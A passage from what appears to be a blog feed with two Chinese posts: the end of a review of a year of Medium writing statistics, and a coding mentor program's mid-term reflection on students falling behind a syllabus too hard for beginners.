href="https://medium.com/@evonneyifangtsai/%E6%88%91%E9%96%8B%E5%A7%8B%E5%AF%ABmedium%E4%B8%80%E5%B9%B4%E4%B9%8B%E5%BE%8C%E7%99%BC%E7%8F%BE%E7%9A%84%E4%BA%8B-d4a492292b05">我開始寫 Medium 一年之後發現的事</a>，才讓我有了想 po 這篇文的念頭。原本是想在剛好一週年左右的時候來寫這篇的，但無奈拖延症又發作，不過幸好才隔一個月而已，說是「一週年」我覺得還是 ok 的。</p><p>話不多說，直接在開頭先給幾個相關數據：</p><blockquote><p>24 篇文章，2600  個追隨者</p></blockquote><blockquote><p>45000 個拍手，20  萬瀏覽次數</p></blockquote><p>如果直接拿來算平均數據很好看，每篇平均 <strong>1875 個拍手，8300 瀏覽次數</strong>。</p><p>哇！超猛！</p><p>可是看平均其實是滿不準的一件事情，要看全部的數字比較準確。下表是一年內發表過的所有文章以及數據（按照瀏覽次數排序），標綠色的代表特別突出，標紅色的代表特別低落（也特別奇怪）：</p><p><img src="/img/one-year-review-2963f072572d/1__QBaph18WbQnBM9b03VRKAg.png"></p><h3 id="年度冠軍寶座到底是什麼來頭？"><a href="#年度冠軍寶座到底是什麼來頭？" class="headerlink" title="年度冠軍寶座到底是什麼來頭？"></a>年度冠軍寶座到底是什麼來頭？</h3><p>這是第一名的文章，介紹在新加坡的四個外送 App：<a href="/2017/10/21/delivery-services-2d90ec1e3555/">四款訂餐外送 App 不專業評測</a></p><p>一共拿到了 35000 次瀏覽次數，可是卻只有 5100 次閱讀，閱讀率 14% 低得嚇人，拍手數居然也只有 108，是全部文章裡面第二低的。</p><p>為什麼？</p><blockquote><p>因為這篇文章的流量來源，90% 是從 Google  來的。</p></blockquote><p>不知道為什麼但這篇的 SEO 好像特別好，不信的話你現在去 Google 搜尋「外送」，看看在第一頁有沒有這篇文章。</p><p>我當初寫的時候怎麼想都沒想到瀏覽次數第一名會是這篇，而原因就是 Google 帶來的流量太驚人了，難怪大家都說 SEO 要做好。我寫這篇的時候台灣的外送 App 還沒起來，那時候好像只有 Uber eats 而已，但現在多了一堆競爭者，剛好這篇文章搭上這波風潮。</p><p>但由於我寫這篇的地點是新加坡，因此我估計很多人看了之後發現不是台灣就直接離開了，才造成如此低落的閱讀率跟拍手數。</p><p>如果仔細觀察的話，你會發現表格上那些閱讀數高，但拍手數跟閱讀率相對低的文章，流量來源第一名全部都是 Google。</p><p>舉例來說，第六名智慧型手錶那篇，87% 的來源是 Google，第四名履歷進化史以及第八名面試問答，有 30% 的來源是 Google，而且都是文章流量來源的第一名。</p><p>而其他文章最大來源則都是 Facebook，第二名技術名詞那篇 30% 來自 Facebook，第三名 AsiaYo 那篇 50% 來自 Facebook。</p><h3 id="特別高的拍手數"><a href="#特別高的拍手數" class="headerlink" title="特別高的拍手數"></a>特別高的拍手數</h3><p><img src="/img/one-year-review-2963f072572d/1__aff52OrZ0pVOYsxBAYnaPA.png"></p><p>在破十萬瀏覽的 7 篇文章裡面，可以看到拍手數有顯著的差異，我們先把那些主要流量是 Google 的拿掉，可以看見數據比較正常一點了，只要能破十萬瀏覽，拍手數大約都有 4000 左右，我覺得是滿合理的數據。</p><p>可是你會看到有一篇特別不合理，就是搞懂技術名詞那一篇，拍手數居然有 17k，就算其他三篇加起來都還是輸它。</p><p>為什麼呢？</p><p>雖然說原因有很多種我也只能用猜的，但我覺得原因之一是因為我在文末加了這段：</p><blockquote><p>喜歡的話可以拍個手，你知道 Medium 最多可以拍 50 下嗎？可以根據你的喜好程度拍不同次數的手，想要拍好拍滿的話我也是樂見其成。</p></blockquote><p>那麼多文章裡，我記得我好像就只有這一篇加了這一段。而也因為這一段的緣故（雖然不是說全部因為它，但我覺得一定有影響），讓拍手數成長為平均的四倍。</p><p>難怪每一個 YouTuber 都要呼籲大家訂閱訂閱訂閱。</p><h3 id="豐富的產量…嗎？"><a href="#豐富的產量…嗎？" class="headerlink" title="豐富的產量…嗎？"></a>豐富的產量…嗎？</h3><p>一年 24 篇文章等於一個月 2 篇，我覺得這個產量算是很不錯了，而且我每篇文章都有一定的長度（不過我沒算過實際字數就是了）。</p><p>不過仔細看的話會發現其實滿多文章我是直接搬以前 blog 的過來，所以應該扣掉這種才對，一共有 5 篇是我搬過來的，所以一年之間新產生的內容其實是 19 篇才對，其實也不錯了，至少一個月有一篇。</p><p>我寫部落格沒有幫自己定任何標準，反正想寫就寫，不想寫就放著也可以。有靈感的時候一個月兩三篇，沒靈感的時候兩三個月一篇，我覺得這都無所謂，部落格對我來說還是整理自己想法的一個空間，給其他人看倒是其次。</p><h3 id="文章的擴散管道"><a href="#文章的擴散管道" class="headerlink" title="文章的擴散管道"></a>文章的擴散管道</h3><p>我覺得程式類的文章跟其他類型的有一個滿大的不同之處，舉例來說，其他類型的文章寫完以後，頂多貼自己臉書或者是 Medium 中文的臉書社團，接著就是看這篇文章能不能擴散出去，似乎不太會有什麼集中的大型社團可以讓你 po 文宣傳（還是其實有但我不知道，例如說什麼知名的商業策略討論社團之類的）</p><p>可是在台灣的程式社群裡面有幾個知名的臉書社團，例如說 <a href="https://www.facebook.com/profile.php?id=521085554595481&ref=br_rs">Front-End Developers Taiwan</a> 就有 25000 個成員，一把文章貼出去，如果質量好的話很快就能夠擴散出去，而我那兩篇破十萬瀏覽的技術科普文就是透過這樣的管道擴散出去的。</p><p><img src="/img/one-year-review-2963f072572d/1__pBn9HXHLyQXNjtokJ71lWw.png"><br><img src="/img/one-year-review-2963f072572d/1__E35OEbrkzIYagGZJ48D4cA.png"></p><p>我覺得有管道讓你一下子就接觸到文章的受眾滿重要的，瀏覽次數可以馬上拉高。不過程式類的文章優點跟缺點是一樣的，優點就是貼到工程師社團就可以打到一堆人，缺點就是大概就只有這些人了，因為一般人也不會平白無故轉一篇程式類的文章（除非真的很偏科普），但會轉發一些跟商業或是職場相關之類的文章，講白一點就是受眾比較侷限。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>沒想到自己寫 Medium 也一年了，至於寫 blog 這件事早就已經久到不會特地去算了。這一年的寫作體驗其實滿舒服的，而這也是我當初決定搬家到這裡的主因：「你只要寫就好了，其他都不用管」</p><p>你不用煩惱裝什麼外掛，因為沒有外掛讓你裝；不用煩惱調什麼字體顏色或是大小，因為沒有這種東西讓你調。在這裡，我可以很專心地專注在寫作上。</p><p>至於這一年來的心得嘛，說實在的沒什麼心得，先感謝一下所有看過我文章的人，再順便謝謝天。我覺得部落格最重要還是寫給自己看，幫自己留下一些什麼，如果我哪天失去了這個初衷，可能會找不到方向或者是為了一些統計數字而苦惱吧，只好提醒自己莫忘初衷。</p><p>最後，我要再來試一次 call to action 是不是真的這麼有用。</p><p>如果你喜歡這篇文章，歡迎幫我按個拍手，Medium 最高可以拍到 50 次，歡迎拍好拍滿。</p><p>也可以按下 Follow 的按鈕來追蹤我，但很抱歉沒有小鈴鐺可以按所以不能設成搶先看。</p><p>感謝閱讀。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>這是一堂沒那麼適合初學者的課程——程式導師實驗計畫第二期期中反思</title>
      <link href="/2018/11/04/mentor-program-2nd-mid-c7539f67b7d7/"/>
      <url>/2018/11/04/mentor-program-2nd-mid-c7539f67b7d7/</url>
      
        <content type="html"><![CDATA[<p><a href="/2018/07/12/mentor-program-s2-f876c4e13d3b/">程式導師實驗計畫第二期</a>從今年 9 月 3 號開始到現在 11 月 4 號，經過了兩個月，而前八週，被我稱之為「基礎」的課程也正式告一段落，為期四個月的計畫也過了一半。</p><p>原本是想跟上一期一樣等整個課程結束再來寫心得，但我仔細想了一下，到那時候期中的心得可能就快忘光了，而且如果等到那時候再寫，文字量一定會爆表，寫個兩萬字也是不無可能，因此才有了這一篇期中反思，與其期末一起反省，不如期中就先好好整理一次，順便跟有在關注這個課程的大家報告一下狀況。</p><h3 id="課程狀況"><a href="#課程狀況" class="headerlink" title="課程狀況"></a>課程狀況</h3><p>目前這一週是第九週，下面這張圖表是截至目前為止有繳交作業的人數（課程總共有 38 個人）：</p><p><img src="/img/mentor-program-2nd-mid-c7539f67b7d7/1__Kp2MnAhaaoPY5xrPAJNyVw.png"></p><p>從圖表裡面可以看到幾點：</p><ol><li>第九週了，還是有人第一週的作業沒完成</li><li>第五週到第六週降幅最大，那週的作業是改良自己第五週完成的留言板</li><li>有「跟上進度」的只有 4 個人，佔課程的 10% 不到</li></ol><p>在談談上面的狀況以前，先來談談這一期課程所引入的淘汰制，只要連續兩週沒交作業加上兩周內有三天沒交進度報告，就會被強迫退出。</p><p>有一個學生在第二週的時候就被淘汰了，因此總學生人數變成 37 人。</p><p>從圖表上可以看出，還沒交第一週作業的有 4 個人，而其中 1 個先交了第三周的作業，這也是為什麼第三週的作業繳交人數反而最多。而其他 3 個人則是「一次作業也沒交」。</p><p>在課程第四週結束時要交保證金 3000 元，課程沒在期限內完成是不會退還的，之後就算被淘汰了也不會退，在那時候我就有特別寫信給這些一次作業都還沒交的同學，信件內容是這樣的：</p><p>Hi,</p><p>會寄給你這封信的原因有兩個：</p><p>1. 你還沒繳交課程保證金 3000 元</p><p>2. 截止目前為止，你還沒有成功繳交任何一次作業</p><p>所以這封信主要的目的是來勸退的，以及再次詢問一下你有沒有繼續待下去的意願（兩者聽起來有點矛盾，這我之後會解釋）。</p><p>在報名的簡章裡面說的很清楚了，這個計畫要付出的時間很多，真的很多，大約是一個禮拜至少四十個小時，才有可能跟上進度。從目前的狀況看來，甚至就算付出了四十個小時，一個毫無基礎的人也沒辦法跟上進度，由此可見課程的強度與密度比我當初預估的還要再更高。</p><p>已經六週過去了， 如果連第一週的作業都還沒交的話，有可能是你每天都很認真，付出一大堆時間在這上面，可是卻還是寫不出來第一週的作業，如果是這樣的話可以來找我協助，我們再來討論看看該怎麼改進這個狀況。</p><p>但當然也有另外一個可能，那就是你在這個計畫上沒有付出相對應的時間，可能是有其他的事情在忙，這個我也能理解，畢竟每個人都有自己其他的事情要忙，而我也有，不是每個人都能全心全意投入在這個計畫上。</p><p>如果你是上面這種狀況，有其他事情在忙所以沒辦法付出時間在這個計畫上，那我會建議你退出。退出並不是一件壞事，而是讓你能夠專心在其他事情上面。對於你來說，現在這個計畫可能是一個額外的負擔，課程進度一直往前，每天還要寫進度報告可是又沒什麼東西可以報告，本身的事情已經很忙了卻還來一個課程。</p><p>這個課程的目標是讓你「轉職成工程師」，而這絕對不是一件容易的事情，這不是你隨意來參加，然後沒有付出什麼時間就能夠咻一下搖身一變成為工程師的計畫，這計畫沒有那麼厲害。</p><p>所以我才會來勸退，因為我認為這樣子兩邊忙可能只會落得兩頭空的下場。如果現在連第一週的作業都還沒交，大概就代表你落後了六週的進度，我敢說這樣子的進度在明年一月結業時課程絕對跟不完，也不可能找到工作。</p><p>如果是這種狀況的話，那其實課程保證金繳了也滿浪費的，繳了不能退回的 3000 塊，然後上了一個自己沒有很想上的課。</p><p>從你繳交作業以及保證金的狀況看起來，我個人是傾向於認為你自己也沒什麼意願繼續待在這個計畫（或也有可能心有餘而力不足，你有意願但就是還有其他事情要忙），無論是哪一種，我都覺得退出對你來說會是一件好事。</p><p>不過我開頭有講了，這封信除了勸退以外，還有一個目的是詢問你有沒有繼續待下去的意願。因為我課程規則就寫在那裡，我沒辦法想淘汰誰就淘汰誰，而你有符合每日進度報告的規則，所以不會被淘汰，因此要不要留下去絕對是你的選擇。</p><p>再者，我上面的假設可能都是錯的，有可能你真的很認真只是我誤認你沒有，那這可能是我的疏忽。但如果上面的假設都是對的，我覺得退出對你或是對我來說都比較好。</p><p>最後，我勸退歸勸退，但你依然可以選擇留下來，我只是「覺得」退出對你我可能都好，但不代表你就要退出，如果你自己覺得留下來對你是件好事，那我也當然歡迎你留下來。</p><p>總之呢，如果想繼續留下來的話，記得在 10&#x2F;15 23:59 以前轉帳，匯款資訊我都有私訊到你們 slack 了，匯款完記得填表單。如果思考過後決定退出計畫，那就不要匯款就行了，這樣我就知道你的意思了。</p><p>大概就是這樣，無論你的選擇是什麼，都祝你之後順利。</p><p>huli</p><p>在信件裡面，我希望能表達的有兩件事，第一件事情是「尊重」，對我來說，尊重一個人就是我把我內心的想法全部跟你說了，但要怎麼選擇是你的事情，我不會強迫你做我希望你做的事。</p><p>意思就是，上面的勸退信我明講了，我「覺得」你沒付出一定時間在這上面，我「覺得」退出對你來說比較好，但因為你沒有違反規定，所以我沒辦法強迫讓你退出，要不要退出仍舊是你的選擇，我是「勸退」，但我不是「逼退」，我希望我有很明白地表現出這件事情。</p><p>不過人與人之間的相處真的是滿奇妙的事，上面這個勸退與逼退的問題也跟信任有關，如果你信任我是真的這樣想，你就會覺得我是勸退，如果你不相信，你可能會說：「都給你講，不就是逼退嗎，講那麼好聽」</p><p>勸退跟逼退的差別在於前者是：「我建議你這樣選，但建議歸建議，你不聽我的建議也行」，而後者是：「你可以不聽我的建議，但如果你沒照我說的選，我之後還是會用盡手段讓你照我的建議走」，從後續的發展應該可以看出我是真的勸退而已，因為他們選擇繼續留下來以後我也沒有特別做什麼事。</p><p>我不喜歡強迫被做任何事情，所以我也不會去強迫別人，所以在我的課程裡面很多事情都是你可以選擇的，你可以選擇要不要退出，選擇要不要回饋心得，選擇要不要參加實體聚會，那是你能夠選的。</p><p>有人可能會說：「可是不是有淘汰制嗎？不是強迫要交作業嗎？」，那不一樣，因為那是你進來這個課程時就知道而且你也同意的，既然同意了，那就不是強迫，而且這不是我逼迫你做的決定，是你自己做的。</p><p>第二件我想強調的事情是：「放棄不是一件壞事」，有很多人很鄙視放棄，覺得放棄就是錯，放棄就是不好。沒有這回事，很多時候放棄反而會救了你，反而會讓你走向一條更好的路。</p><p>有些人會強調永不放棄、堅持到底的價值，就像是<a href="https://www.youtube.com/watch?v=kEyjdK0rJ94">電影裡面那樣</a>，只有堅持到底，才能達成你想像不到你自己能做的事。但如果你是<a href="https://tw.news.yahoo.com/%E6%97%A5%E9%A6%AC%E6%8B%89%E6%9D%BE%E5%A5%B3%E9%81%B8%E6%89%8B%E6%96%B7%E8%85%BF%E4%B9%9F%E8%A6%81%E8%B7%91%E5%AE%8C-%E4%BB%A5%E5%89%8D%E9%A0%8C%E6%8F%9A%E7%8F%BE%E6%98%AF%E7%BD%B5%E8%81%B2%E4%B8%8D%E6%96%B7-011911067.html">日本馬拉松比賽</a>裡面的那個選手，你會選擇永不放棄，用爬的也要爬到終點，還是果斷放棄？</p><p>堅持跟放棄並不是互斥的，我想強調的是你當然可以堅持，但同時也要知道「放棄」是一個選項，而不是「永遠不能放棄」。我也同意這中間的標準有時候很難拿捏，如果太不堅持可能事情沒辦法做好，可是如果太過堅持又會造成一些傷害，也只能透過慢慢摸索去找到那個平衡點。</p><p>總之呢，在我寄了勸退信以後，有一個同學決定退出，其他決定繼續留下來，因此課程總人數變成 36 人。</p><p>截止目前為止，就沒有再被淘汰以及主動退出了，所以就維持著 36 人，而有些同學還是一週的作業都沒有交。</p><h3 id="進度的嚴重落後，是誰的責任？"><a href="#進度的嚴重落後，是誰的責任？" class="headerlink" title="進度的嚴重落後，是誰的責任？"></a>進度的嚴重落後，是誰的責任？</h3><p>接著我們來看這堂課程目前顯現的一個最大問題，那就是課程進度嚴重落後，有許多學生完全跟不上。如果把交了第一週作業的 32 人看做是分母，然後每週有交作業的人當作是分子的話，下面是第四週開始的比例：</p><ol><li>第四週：87.5%</li><li>第五週：72%</li><li>第六週：47%</li><li>第七週：34%</li><li>第八週：28%</li><li>第九週：12%</li></ol><p>有一半的人落後了兩週至三週的進度，只有將近一成的人跟的上課程，這樣到底是學生的問題（沒付出時間），還是課程的問題（難度太高）？</p><p>要確認這個問題很簡單，只要看學生是不是真的付出時間在這上面就好，如果學生真的都付出了很多時間，可是還是跟不上，而且還不只一個而是很多個學生，那怎麼會是學生的問題？</p><p>總之呢，根據我跟幾個學生聊一下以及收到的課程回饋，很明顯的，這是課程本身的問題。</p><p>這也是標題的由來：</p><blockquote><p>這是一堂沒那麼適合初學者的課程</p></blockquote><p>有些人可能會問說：「咦？你當初簡章不是說沒基礎也可以嗎？還說希望把零基礎初學者培養成工程師，怎麼現在又說這堂課沒那麼適合初學者？」</p><p>你講的很對，我當初是那樣說得沒錯，但我的理想、我的希望是一回事，實際上怎麼樣當然很有可能是另外一回事，而現在發生的狀況就是我對課綱太過於樂觀了，以為這樣子的進度對初學者來說可以，結果完全不行。</p><p>而課程進度跟不上其實就某個層面來說也還好，我意識到這件事情之後就一直跟同學們說：沒關係，大家按照自己的步調來就好，不用管課程進度，不用硬跟，你有學到東西最重要。</p><p>可是這樣是不夠的，因為影響更大的其實是心理層面。這點我也是跟同學聊過以後才意識到的，很多同學會覺得怎麼其他人跟得上自己卻跟不上，這一定是自己的問題，接著就是一連串的自我否定，甚至到最後還可能會想退出課程，因為沒有動力再繼續跟了。</p><p>我覺得我有責任跟大家好好說明一下這件事情，所以就在剛進入第八週的時候，寫了下面這段給他們（不喜歡 Medium 內建引用會產生的斜體，就用分隔符號來區隔了）：</p><p>大家安安</p><p>根據最近收到的課程回饋以及跟一些同學聊過之後，發現大家對於「進度」這件事情會因為跟不上而感到無力甚至焦慮，儘管我之前說大家可以按照自己進度來，但仍然還是有種「唉，我怎麼跟不上進度的」的感嘆。</p><p>有鑑於此，我覺得我應該統一來說明一下課程狀況。</p><p>首先，我們來看一下課程作業的繳交狀況（原本一共 38 人，兩人退出後剩 36 人）：</p><p>1. 第一週：34 人，94% 完成率<br>2. 第二週：28 人，77% 完成率<br>3. 第三週：33 人，92% 完成率<br>4. 第四週：27 人，75% 完成率<br>5. 第五週：19 人，52% 完成率<br>6. 第六週：11 人，30% 完成率<br>7. 第七週： 4 人，11% 完成率<br>8. 第八週： 2 人，5 % 完成率</p><p>不知道看到這個大家有沒有釋懷一點？目前剛進入第八週，有跟上進度，已經做完第七週作業的只有 4 人，大約只有 10% 的人有跟上進度而已。</p><p>所以你沒有跟上進度是很正常的一件事。</p><p>我之前跟一個同學聊過，他說他的壓力來源來自於：「他覺得應該要跟得上，可是他沒有；怎麼好像其他人都跟得上，可是自己卻跟不上，是不是自己的問題？」</p><p>但從這個統計數據你就可以看出來，沒有「其他人」都跟得上這回事，真相是「其他人」也跟不上，有高達九成的人都跟不上。</p><p>當初我在寫報名簡章的時候，上面寫了你毫無基礎也可以來報名，而我希望能夠在四個月內把你培養成工程師。</p><p>但經歷過八週以後，我逐漸明白以目前的狀況，這幾乎是不可能的事，我在這邊跟大家重申一次，這個課程沒跟上是很正常的一件事。</p><p>錯估情勢的原因之一是上一期沒有太多樣本可以讓我參考，所以讓我誤以為所有人都可以跟上進度。還有一個原因是我錯估「無基礎」這件事了。</p><p>「無基礎」並不是一個全有或全無的東西，你的無基礎跟我的無基礎，還是可以有程度上的差異。舉例來說，一個大學念文組並且寫過兩週 Java 的人，跟一個數理很強但沒有寫過程式的人，我相信後者其實在「基礎」上是更紮實的。</p><p>因為你必須承認，文組跟理組的思考模式是不一樣的，理工科的思維模式會更貼近寫程式所需要的那種思考方式，把問題切割、一步一步來、解決小問題之後解決大問題。就像我們程式裡教的遞迴跟函式，你在數學中都可以找到一樣的東西，所以數理強對寫程式有一定的幫助。</p><p>所以目前為止這個計畫的第一個錯誤是沒有把這個思考方式給培養起來，這個才是大家真正需要的基礎。而且我認為這個一但培養起來，之後的課程就會順利很多，我 JS101 那堂課其實就是想解決這個問題，給大家一堆練習題讓大家培養這種思考方式。</p><p>但這種思考方式當然不是一朝一夕可以養成的，它需要時間，而且需要的時間因人而異，有可能需要很多很多時間。</p><p>所以儘管大家可能都無基礎，但別人對這方面的資質就是比你好，他就是早已利用這種思考模式在解題，所以自然就會比你快很多。</p><p>可能有人會覺得：「既然他可以，為什麼你不行？」，但光從這句話看起來，你仔細想想會發現滿沒有道理的，為什麼他可以你就要可以？從邏輯上看起來，他可以只代表「有人可以」，跟你可不可以一點關聯都沒有。</p><p>而且這句話基本上是忽略了個體之間的差異，有些人就是天生就有某些才能，可是有些人就要花更多更多的時間才能把這個差距給補足。他做得到，僅僅代表至少有人能做得到，但我做不做得到跟他一點關係都沒有，我唯一可以做的事情就是盡力去做。</p><p>這個計畫第二個錯誤是低估了吸收的時間，我忘記了教跟學完全是兩回事，我每週都把我想教的東西教出去了，可是教學並不是你講了 100%，學生就能得到 100%，有可能學生只能得到一半或是更少。</p><p>如果你教什麼學生就得到什麼，那大家去聽個幾堂 AI 的課之後就都是 AI 大師了。學習需要時間吸收、需要練習，需要把吸收的知識自己整理過後重新組織，最後才能內化成為自己的東西。</p><p>以目前的課綱來說，真的太趕了。中間沒有時間讓你吸收，禮拜一聽概論，禮拜二三查資料，禮拜四再聽一些，禮拜五六查資料，禮拜日寫作業，作業都還沒寫完，下一週就到了，就又有新的進度了。</p><p>所以永遠都在追趕新的進度，前面的東西都還沒吸收完成，就要繼續學新的東西了。這點真的很趕，所以我才一再強調可以按照自己進度來，不然一直追逐新的進度導致消化不良其實有種揠苗助長的感覺。</p><p>講了這麼多，我想強調的第一件事情是：這堂課的確是有沒有基礎都能上，但你要跟完四個月超級無敵難。我設計課綱的時候原本「以為」人人都可以，但事實證明我錯了。</p><p>能跟完課程的都是那些已經有基礎的人，甚至多數其實都有半年一年的程式經驗，所以對真的沒基礎沒接觸過程式又不是理工背景的人來說，要跟著進度走根本就是天方夜譚。</p><p>如果你能肯定這點，那你的壓力應該會小一點。與其把這堂課想成是初學者入門課，不妨想成前兩週是入門班，三四週是初學者班，五六週是進階班，七八週又再更進階了。</p><p>就好像你一兩週還在學加減乘除，三四週背個九九乘法表再熟悉一下四則運算，五六週就突然教你開根號跟 log，靠腰勒，這樣跟不上也很正常吧。</p><p>再次強調，跟不上絕對不是你的問題，是我的這課綱對初學者不友善，希望這能讓大家心裡好過一點。</p><p>從另一個方向來講，就代表能跟上課綱的同學真的很厲害，因為課程緊湊然後教的東西又一大堆。我們這次也有收一些工程師，我相信已經在工作的工程師，看到這課綱也會嚇一跳，想說怎麼四個月就教了一大堆的東西，而且很多東西可能連你的工程師朋友也不熟悉。</p><p>那跟不上的同學到底該怎麼辦呢？</p><p>第一點，肯定自己的價值，不是你的問題，真的不是。如果你付出一大堆時間卻還是跟不上，而且不只你，有一大堆同學也跟不上，那怎麼會是你的問題？</p><p>第二點，試著照著自己的步調來，如果你都已經知道這堂課要跟上進度基本上是一個不合理的行為，那應該也會對跟上進度這件事沒有壓力了。</p><p>這就好像你今天是一個不會踢足球的人，然後你直接去修校隊開的高級足球課程，你會覺得其他人都踢得很好只有自己踢得不好很奇怪嗎？不會嘛，因為人家本來就是校隊練足球練超久，你才剛開始而已，這很正常。你也不會看到 NBA 球星球打得很好就覺得自己籃球爛到爆。</p><p>把這點套在課程上也是一樣的，這不是堂適合初學者的課，所以進度跟不上很正常，只要跟著自己的進度來就好。</p><p>第三點，不要把這個計畫想成四個月就可以轉職。</p><p>其實我覺得還是有機會的，但機會真的不大，可能要再多加個兩個月。不過四個月過後還是可以出去求職看看，到時候你也會有一定的實力在，可以先試試水溫。也有可能面試官看你基礎滿穩人格特質不錯，就直接錄取你了。</p><p>再次重申，我原本以為四個月對初學者來說可以，但已經被打臉了，這真的太困難，以目前的課程架構來說我覺得沒辦法，但如果能把時間多延長一兩個月，我覺得還是滿有希望的，所以跟不上的同學可以把時間抓在明年三月左右跟完課程。</p><p>所以如果你跟不上進度，可以找其他也跟不上的同學互相聊聊然後互相砥礪一下，繼續跟著自己的步調寫作業。為了要讓自己繼續投入在課程上，你也還是可以跟每週的直播，作業沒寫也可以看檢討，也可以看教學，例如說你還在第四週，你一樣可以看第七週的教學，第七週的教學你可能看得不是很懂，但至少會有個感覺。</p><p>等你從第四週慢慢進度跟到第七週的時候，可以再看一次影片，到時候一定會有全新的體悟，而且這中間有三週的時間讓你慢慢吸收，其實也挺不錯的。</p><p>好啦，大概就是這樣，落落長的一篇是希望能讓大家好好想一下自己之後步調應該怎麼調整，心態上也可以調整，因為心態也滿重要的。</p><p>如果你跟不上，那很正常，不要灰心，你就把這課程想成是進階班，你一個無基礎小白兔能慢慢跟已經很厲害了，只要多延長兩個月把課程跟完，一樣很有機會找到工作。</p><p>如果你跟得上，那也很不錯，只要能繼續保持，我覺得四個月出來以後找工作應該不是什麼問題（只是「我覺得」，現實狀況還是要等大家出去面試才知道 XD）</p><p>就是這樣啦，有什麼意見都可以再跟我說，感謝大家。</p><p>上面這落落長的文章其實對同學們滿有幫助的，對有些人來說可能就像是心裡的一個結被解開了，他們知道自己並不孤單，知道不是自己的問題。</p><p>以上這些也大概說明了目前課程的狀況，就是課綱比我預期中的還要難，導致大多數人都停留在第四週（Ajax 與 API 串接）與第五週（PHP 留言板）。</p><h3 id="Fail-fast-fail-often"><a href="#Fail-fast-fail-often" class="headerlink" title="Fail fast, fail often"></a>Fail fast, fail often</h3><p>如果我今天自己想做一個產品，我絕對會先做一個 MVP 丟下去試水溫，然後再根據回饋不斷改善產品做快速迭代，實際下去試一遍比自己空想一大堆可能根本不存在的假設有用多了。</p><p>可是一開始在做這課程的時候不知道為何，我卻忘記這種 mindset 了，一直到近期我才想起來。</p><p>儘管我在第六七週就意識到課程的問題，但那時候我還沒想到什麼解決方法，因為我必須要維持課程的主進度，也就是一週週持續前進，沒辦法把課程往回倒，因為一但往回了，那主進度怎麼辦？</p><p>可是我後來重新想過一遍，我想通了。對於前面的學生來說，其實他們的進度是很 ok 的，而且主進度也有上一期的直播可以來補，講的東西都是差不多的，再者，這堂課的目的就是希望能幫助大多數人轉職，而不只是服務前段班已經對程式概念比較熟悉或是很快就能抓住重點的學生。</p><p>如果今天有一半的人都跟不上進度，那就應該先跳回去協助那一半的人。</p><p>因此我在之後的課程做了些調整，原本第十週第十一週一共四次的直播都改成大家卡住的第五六七八週的 PHP 留言板教學，而原本就跟上進度的學生一來可以複習，二來也可以跟我約另外的時間好好檢討一下之前的作業，所以無論進度有沒有跟上都會被照顧到。</p><p>下週才是第十週，所以成效要到兩週後才會知道，但我相信我自己跳下去實際一步步再教一次，效果應該會不錯才對。</p><h3 id="課程優化"><a href="#課程優化" class="headerlink" title="課程優化"></a>課程優化</h3><p>前面談了一大堆這次課程不足或是設計不良的地方，最後該來談一些做的很正確的地方了。</p><p>第一點是我有重看一次<a href="/2018/06/26/mentor-program-review-a9c6668dfb/">第一期的檢討</a>，試圖把我想改進的地方加進去，例如說這一期很早就開始講物件導向的觀念了，並且從物件導向就可以帶到 this 跟 prototype，而 hoisting 跟 closure 也有提到不過算是額外補充。</p><p>第一期幾乎完全沒提到的 fetch 與 Promise 也加了進去，在後端的課程中也一併加了 View、Stored procedure 以及 triggers，把課程的內容變得更豐富也更完整了，一步步在優化課程大綱。</p><p>不過現在的課程大綱與進度還是不適合初學者，因為速度真的太快，而且內容其實也教滿多的，至於會不會塞太多東西，我倒是覺得還好，很多東西概念抓住就好，實作可以慢慢來，有用到再練習就好，至少先知道它是什麼東西，之後要查資料也比較容易。</p><p>然後關於一些基礎概念，因為 coding 火球術回歸的關係所以這方面就解決了，他們可以自己去看火球術的影片學到一些跟計概比較有關的東西，不至於說什麼都不懂。</p><p>還有一件事情我一直跟我的學生強調，那就是我這堂課的「基礎」其實跟很多人定義的基礎不太一樣，我覺得我這堂課的基礎扎實很多，儘管在我這邊稱作基礎，可能在其他課程就當作是進階的內容來上了。</p><p>下面是課程大綱，歡迎路過的工程師大大們幫我鑑定一下我這樣的課綱深度如何：<a href="https://github.com/Lidemy/mentor-program-2nd">Lidemy&#x2F;mentor-program-2nd</a></p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>教學的過程中，其實我大部分都是迷惘的，我還是拿捏不到深與淺的界線。</p><p>上一期完課的人寥寥無幾，我原本以為是因為很多人退出的關係，現在經過第二期的驗證才發現不是的，是課程本身就規劃的沒那麼好，為了趕進度所以速度太快，一大堆東西都沒有教好，對有基礎的人會覺得充實、覺得進度很快但還跟得上。</p><p>可是對沒基礎的人來說，「靠杯你在快三小，怎麼這麼多東西塞在一週裡面，鬼才寫得完作業」。而且吸收是需要時間的，有些事情聽的時候只有個模糊的概念，搭配實作才能將迷霧逐漸撥開，看清楚事情的本質。</p><p>除此之外，也學習到幾件很重要的事情。</p><p>第一件事情是教跟學是兩回事， 教歸教，學歸學，不是你講了什麼，學生就一定能夠吸收到什麼。有可能你講了 100%，學生吸收到的只有 50%，想一想也發現這很正常，不然每個人隨便看完一本相關的書籍就是程式大師了。</p><p>儘管我課綱列出來所有我覺得重要的技能而且我都教了，但不能保證學生就能完全吸收，變成我心目中所想的那樣子。</p><p>第二件事情是對於「無基礎」的重新理解。</p><p>很多課程都標榜是「無基礎」，可是無基礎是怎樣的無基礎？我在這次教學過後，才了解到無基礎是一個光譜而不是二分法。</p><p>一個數理邏輯超強但沒寫過程式的人，跟一個數理邏輯很差可是有寫過一個月程式的人，前者真的「沒有程式基礎」，可能他的表現很有可能會比後者好。</p><p>最重要的其實是「寫程式的思考方式」，你一拿到這項技能就輕輕鬆鬆鬆，沒拿到就跌跌撞撞。這種思維模式就是 computational thinking，也是我很認同教育應該要教的。</p><p>最後則是再次體驗到教學真的是一件很難的事，你在成長，我也在成長，我看你的程式碼我只會越看越覺得：「不就這樣嗎？到底難在哪裡」，可是你看自己的或是看別人的都會想說：「現在到底是怎樣？這段到底是在幹嘛？為什麼我都看不懂？」</p><p>尤其是當程度差太多的時候，教學已經不能光憑著「感覺」，憑著「同理」，而是要憑著過去累積起來的經驗，才能試圖去靠近學生的想法。</p><p>總之呢，課程還有一半的路沒有走完，我還可以繼續優化，還可以試著把那一半的人往上拉，試圖把課程改善得更好。</p>]]></content>
